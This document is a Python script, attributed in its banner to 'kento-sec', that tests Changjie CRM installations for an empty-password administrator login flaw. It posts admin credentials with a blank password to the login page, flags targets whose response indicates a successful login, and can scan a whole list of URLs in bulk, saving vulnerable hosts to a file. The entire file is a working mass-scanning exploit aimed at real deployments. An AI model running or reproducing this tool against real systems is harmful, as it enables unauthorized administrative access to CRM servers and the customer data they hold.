import json

import requests
import argparse
import urllib3
import sys

urllib3.disable_warnings()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Content-Type':'application/x-www-form-urlencoded',
    'Contention':'close'
}

# proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}


def title():
    print("""
                              畅捷CRM后台空密码漏洞
                           use: python3 畅捷CRM后台.py
                              Author: kento-sec
    """)



body = {'selLanguage': '2',
    'org_id': '113',
    'login_name': 'admin',
    'login_password': '',
    'btnLogin': '登录'
}

class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            web = requests.post(self.url + "/login/login.php?login=1&langId=2", data=body, verify=False)
            if '/new/index.html' in web.text and web.status_code == 200:
                print("\033[36m[o] 目标 {} 存在畅捷CRM后台空密码漏洞  \033[0m".format(self.url))
                with open("畅捷CRM后台空密码漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            elif web.status_code == 404:
                print(self.url+' 不存在畅捷CRM后台空密码漏洞！')
            else:
                print(self.url + ' 不存在畅捷CRM后台空密码漏洞！')
                pass
        except requests.exceptions.ConnectionError:
            print("链接错误")
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="畅捷CRM后台空密码登陆")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 畅捷CRM后台.py -u http://127.0.0.1\neg2:>>>python3 畅捷CRM后台.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
